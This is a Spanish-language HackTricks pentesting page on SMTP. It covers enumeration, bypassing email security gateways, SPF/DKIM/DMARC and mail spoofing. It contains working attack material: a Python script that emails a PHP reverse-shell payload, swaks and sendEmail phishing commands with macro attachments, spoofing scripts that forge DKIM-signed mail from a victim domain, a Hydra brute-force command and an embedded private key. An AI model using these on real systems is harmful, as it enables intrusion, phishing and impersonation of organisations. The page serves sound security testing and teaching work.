# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}


## **Información básica**

El **Simple Mail Transfer Protocol (SMTP)** es un protocolo utilizado dentro de la suite TCP/IP para el **envío y recepción de correo electrónico**. Debido a sus limitaciones para encolar mensajes en el extremo del destinatario, SMTP se emplea a menudo junto con **POP3 o IMAP**. Estos protocolos adicionales permiten a los usuarios almacenar mensajes en un buzón en el servidor y descargarlos periódicamente.

En la práctica, es común que los **programas de correo** utilicen **SMTP para enviar correos**, mientras que emplean **POP3 o IMAP para recibirlos**. En sistemas basados en Unix, **sendmail** destaca como el servidor SMTP más frecuentemente usado para fines de correo. El paquete comercial conocido como Sendmail incluye un servidor POP3. Además, **Microsoft Exchange** ofrece un servidor SMTP y la opción de incluir soporte POP3.

**Puerto por defecto:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
## Gateways de seguridad de correo (SEGs)

Como se menciona en este [blog post](https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/) **Secure Email Gateways (SEGs)** se sitúan **in-line** con el flujo de correo entrante al **cambiar MX records** para apuntar al SEG en lugar del servidor de correo. El SEG inspecciona el correo entrante (p. ej., reputación de IP, blocklists, SPF checks, detección de spoofing, análisis de metadata/contenido, sandboxing, URL rewriting) y luego reenvía, descarta o pone en cuarentena mensajes según la política. El modelo de seguridad asume que **todo el correo entrante llega al SEG primero**; si el servidor de correo puede ser alcanzado directamente, se puede **evitar** el SEG (similar a saltarse un WAF hablando directamente con el origin).

### Evitar SEGs mediante discrepancia de MX

Las organizaciones que usan Entra ID / Exchange Online suelen tener **múltiples accepted domains**. Si **algún accepted domain** tiene un MX record que **apunta directamente al servidor de correo** (p. ej., Exchange Online) en lugar del SEG, puedes entregar correo a ese dominio y **evitar el SEG**. Esto es una **misconfiguración** (no una vulnerabilidad) pero sigue siendo un hueco común.

También ten en cuenta el dominio por defecto `<tenant>.onmicrosoft.com`: su MX record siempre apunta a Exchange Online. Si la entrada a `*.onmicrosoft.com` no está **restringida**, enviar a `user@<tenant>.onmicrosoft.com` puede llegar directamente a la bandeja de entrada evitando el SEG.

**Notas defensivas**:

- Restringir la entrada a `*.onmicrosoft.com`.
- Auditar regularmente los accepted domains y su enrutamiento MX.
- Configurar los servidores de correo para que **solo acepten** inbound desde el SEG.

### EMAIL Headers

Si tienes la oportunidad de **hacer que la víctima te envíe un email** (por ejemplo, mediante el formulario de contacto de la web), hazlo porque **podrías aprender sobre la topología interna** de la víctima viendo los headers del correo.

También puedes obtener un correo de un SMTP server que intenta **enviar a ese servidor un email a una dirección inexistente** (porque el servidor enviará al atacante un NDN mail). Pero asegúrate de enviar el correo desde una dirección permitida (check the SPF policy) y de que puedas recibir mensajes NDN.

También deberías intentar **enviar contenidos distintos porque puedes encontrar información más interesante** en los headers como: `X-Virus-Scanned: by av.domain.com`\
Deberías enviar el archivo de prueba EICAR.\
Detectar el **AV** puede permitirte explotar **vulnerabilidades conocidas.**

## Acciones básicas

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Encontrar servidores MX de una organización
```bash
dig +short mx google.com
```
### Enumeración
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Divulgación de información

Si el servidor admite NTLM auth (Windows) puedes obtener información sensible (versiones). Más info [**here**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
O **automatiza** esto con el plugin **nmap** `smtp-ntlm-info.nse`

### Nombre interno del servidor - Divulgación de información

Algunos servidores SMTP autocompletan la dirección del remitente cuando se emite el comando "MAIL FROM" sin una dirección completa, revelando su nombre interno:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

Comprueba si obtienes alguna contraseña de los paquetes hacia el puerto 25

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Username Bruteforce Enumeration

**La autenticación no siempre es necesaria**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### Herramientas automáticas
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## Informes DSN

**Delivery Status Notification Reports**: Si envías un **correo electrónico** a una organización a una **dirección inválida**, la organización te notificará que la dirección era inválida enviando un **correo de vuelta**. Los **encabezados** del correo devuelto **contendrán** posible **información sensible** (como la dirección IP de los servicios de correo que interactuaron con los informes o información del software antivirus).

## [Commands](smtp-commands.md)

### Enviar un correo electrónico desde la consola de linux
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
Al adjuntar archivos con `swaks`, utilice el prefijo `@` para que los bytes del archivo se incrusten en lugar de la cadena literal del nombre de archivo. Esto es crítico para entregar documentos con macros:
```bash
swaks --to hr@example.local --from attacker@evil.com --header "Subject: Resume" --body "Please review" --attach @resume.doc --server 10.0.0.5
```
### Enviando un correo electrónico con Python

<details>

<summary>Código Python aquí</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

La vulnerabilidad SMTP Smuggling permitió evadir todas las protecciones SMTP (consulta la siguiente sección para más información sobre las protecciones). Para más información sobre SMTP Smuggling consulta:


{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Countermeasures

Las organizaciones evitan que se envíen correos no autorizados en su nombre empleando **SPF**, **DKIM** y **DMARC** debido a la facilidad para falsificar mensajes SMTP.

Una **guía completa de estas contramedidas** está disponible en [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [was "deprecated" in 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). This means that instead of creating a **TXT record** in `_spf.domain.com` you create it in `domain.com` using the **same syntax**.\
> Además, para reutilizar registros SPF anteriores es bastante común encontrar algo como `"v=spf1 include:_spf.google.com ~all"`

**Sender Policy Framework** (SPF) es un mecanismo que permite a los Mail Transfer Agents (MTAs) verificar si un host que envía un correo está autorizado consultando una lista de servidores de correo autorizados definida por las organizaciones. Esta lista, que especifica direcciones/rangos IP, dominios y otras entidades **autorizadas para enviar correo en nombre de un nombre de dominio**, incluye varios **mecanismos** en el registro SPF.

#### Mecanismos

De [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mecanismo | Descripción                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Coincide siempre; se usa para un resultado por defecto como `-all` para todas las IPs que no coincidan con mecanismos anteriores.                                                                                                                                                                                                  |
| A         | Si el nombre de dominio tiene un registro de dirección (A o AAAA) que se puede resolver a la dirección del remitente, coincidirá.                                                                                                                                                                                                  |
| IP4       | Si el remitente está en un rango de direcciones IPv4 dado, coincide.                                                                                                                                                                                                                                                               |
| IP6       | Si el remitente está en un rango de direcciones IPv6 dado, coincide.                                                                                                                                                                                                                                                               |
| MX        | Si el nombre de dominio tiene un registro MX que resuelve a la dirección del remitente, coincidirá (es decir, el correo proviene de uno de los servidores de correo entrante del dominio).                                                                                                                                          |
| PTR       | Si el nombre de dominio (registro PTR) de la dirección del cliente está en el dominio indicado y ese nombre de dominio resuelve a la dirección del cliente (reverse DNS con confirmación hacia delante), coincide. Este mecanismo está desaconsejado y debería evitarse, si es posible.                                                 |
| EXISTS    | Si el nombre de dominio dado se resuelve a cualquier dirección, coincide (sin importar a qué dirección resuelva). Esto se usa raramente. Junto con el lenguaje macro de SPF ofrece coincidencias más complejas como consultas DNSBL.                                                                                              |
| INCLUDE   | Referencia la política de otro dominio. Si la política de ese dominio pasa, este mecanismo pasa. Sin embargo, si la política incluida falla, el procesamiento continúa. Para delegar completamente la política a otro dominio debe usarse la extensión redirect.                                                                      |
| REDIRECT  | <p>Un redirect es un puntero a otro nombre de dominio que aloja una política SPF; permite que múltiples dominios compartan la misma política SPF. Es útil cuando se trabaja con una gran cantidad de dominios que comparten la misma infraestructura de correo.</p><p>Se usará la política SPF del dominio indicado en el mecanismo redirect.</p> |

También es posible identificar **calificadores** que indican **qué debe hacerse si un mecanismo coincide**. Por defecto se usa el **calificador "+"** (así que si cualquier mecanismo coincide, significa que está permitido).\
Normalmente verás **al final de cada política SPF** algo como: **\~all** o **-all**. Esto se utiliza para indicar que **si el remitente no coincide con ninguna política SPF, debes marcar el correo como no confiable (\~) o rechazarlo (-).**

#### Calificadores

Cada mecanismo dentro de la política puede ir precedido por uno de cuatro calificadores para definir el resultado deseado:

- **`+`**: Corresponde a un resultado PASS. Por defecto, los mecanismos asumen este calificador, haciendo `+mx` equivalente a `mx`.
- **`?`**: Representa un resultado NEUTRAL, tratado de manera similar a NONE (sin política específica).
- **`~`**: Denota SOFTFAIL, sirviendo como punto intermedio entre NEUTRAL y FAIL. Los correos que dan este resultado suelen aceptarse pero marcarse en consecuencia.
- **`-`**: Indica FAIL, lo que sugiere que el correo debe rechazarse directamente.

En el siguiente ejemplo se ilustra la **política SPF de google.com**. Observa la inclusión de políticas SPF de diferentes dominios dentro de la primera política SPF:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Tradicionalmente era posible suplantar cualquier nombre de dominio que no tuviera un registro SPF correcto o que no tuviera ninguno. **Hoy en día**, si un **correo electrónico** proviene de un **dominio sin un registro SPF válido**, probablemente va a ser **rechazado/marcado como no confiable automáticamente**.

To check the SPF of a domain you can use online tools like: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM se utiliza para firmar los correos salientes, permitiendo su validación por Mail Transfer Agents (MTAs) externos mediante la obtención de la clave pública del dominio desde DNS. Esta clave pública se encuentra en el TXT record del dominio. Para acceder a esta clave, hay que conocer tanto el selector como el nombre de dominio.

Por ejemplo, para solicitar la clave, el nombre de dominio y el selector son esenciales. Estos se pueden encontrar en la cabecera del correo `DKIM-Signature`, p. ej., `d=gmail.com;s=20120113`.

Un comando para obtener esta información podría verse así:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Autenticación de mensajes basada en dominio, Informes y Conformidad)

DMARC mejora la seguridad del correo electrónico basándose en los protocolos SPF y DKIM. Define políticas que guían a los servidores de correo en el manejo de los correos electrónicos de un dominio específico, incluyendo cómo tratar fallos de autenticación y a dónde enviar informes sobre las acciones de procesamiento de correo.

**Para obtener el registro DMARC, necesitas consultar el subdominio \_dmarc**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### Etiquetas DMARC

| Tag Name | Propósito                                     | Sample                          |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | Versión del protocolo                          | v=DMARC1                        |
| pct      | Porcentaje de mensajes sometidos a filtrado    | pct=20                          |
| ruf      | URI de reporte para reportes forenses          | ruf=mailto:authfail@example.com |
| rua      | URI de reporte de reportes agregados           | rua=mailto:aggrep@example.com   |
| p        | Política para el dominio organizacional        | p=quarantine                    |
| sp       | Política para subdominios del OD               | sp=reject                       |
| adkim    | Modo de alineamiento para DKIM                 | adkim=s                         |
| aspf     | Modo de alineamiento para SPF                  | aspf=r                          |

### **¿Qué pasa con los subdominios?**

**From** [**here**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Necesitas tener registros SPF separados para cada subdominio desde el que desees enviar correo.\
Lo siguiente fue publicado originalmente en openspf.org, que solía ser un gran recurso para este tipo de cosas.

> The Demon Question: What about subdomains?
>
> If I get mail from pielovers.demon.co.uk, and there's no SPF data for pielovers, should I go back one level and test SPF for demon.co.uk? No. Each subdomain at Demon is a different customer, and each customer might have their own policy. It wouldn't make sense for Demon's policy to apply to all its customers by default; if Demon wants to do that, it can set up SPF records for each subdomain.
>
> So the advice to SPF publishers is this: you should add an SPF record for each subdomain or hostname that has an A or MX record.
>
> Sites with wildcard A or MX records should also have a wildcard SPF record, of the form: \* IN TXT "v=spf1 -all"

Tiene sentido: un subdominio puede estar en una ubicación geográfica diferente y tener una definición SPF muy distinta.

### **Relay abierto**

Cuando se envían correos electrónicos, es crucial asegurarse de que no sean marcados como spam. Esto se consigue a menudo mediante el uso de un **servidor de retransmisión en el que confía el destinatario**. Sin embargo, un problema común es que los administradores pueden no saber completamente qué **rangos de IP es seguro permitir**. Esta falta de comprensión puede provocar errores en la configuración del servidor SMTP, un riesgo que se identifica con frecuencia en las evaluaciones de seguridad.

Una solución alternativa que algunos administradores usan para evitar problemas de entrega de correo, especialmente en comunicaciones con clientes potenciales o en curso, es **permitir conexiones desde cualquier dirección IP**. Esto se hace configurando el parámetro `mynetworks` del servidor SMTP para aceptar todas las direcciones IP, como se muestra a continuación:
```bash
mynetworks = 0.0.0.0/0
```
Para comprobar si un servidor de correo es un open relay (lo que significa que podría reenviar correo desde cualquier fuente externa), se suele usar la herramienta `nmap`. Incluye un script específico diseñado para probar esto. El comando para realizar un escaneo detallado en un servidor (por ejemplo, con IP 10.10.10.10) en el puerto 25 usando `nmap` es:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Herramientas**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **Comprobar misconfiguraciones de SPF y DMARC**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Obtener automáticamente las configuraciones de SPF y DMARC**

### Enviar Spoof Email

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**O puedes usar una herramienta:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> Si recibes algún **error using in the dkim python lib** al parsear la clave, puedes usar la siguiente.\
> **NOTA**: Esto es solo un arreglo sucio para hacer comprobaciones rápidas en casos donde por alguna razón la openssl private key **cannot be parsed by dkim**.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**O puedes hacerlo manualmente:**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># This will send an unsigned message
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **Más info**

**Encuentra más información sobre estas protecciones en** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Otros indicadores de phishing**

- Antigüedad del dominio
- Enlaces que apuntan a direcciones IP
- Técnicas de manipulación de enlaces
- Adjuntos sospechosos (poco comunes)
- Contenido del correo malformado
- Valores usados que difieren de los de los encabezados del correo
- Existencia de un certificado SSL válido y de confianza
- Envío de la página a sitios de filtrado de contenido web

## Exfiltration through SMTP

**Si puedes enviar datos vía SMTP** [**read this**](../../generic-hacking/exfiltration.md#smtp)**.**

## Archivo de configuración

### Postfix

Usualmente, si está instalado, en `/etc/postfix/master.cf` contiene **scripts para ejecutar** cuando, por ejemplo, un nuevo correo es recibido por un usuario. Por ejemplo la línea `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` significa que `/etc/postfix/filtering` se ejecutará si se recibe un nuevo correo para el usuario mark.

Otros archivos de configuración:
```
sendmail.cf
submit.cf
```
## Referencias

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- <https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/>

## Comandos automáticos de HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
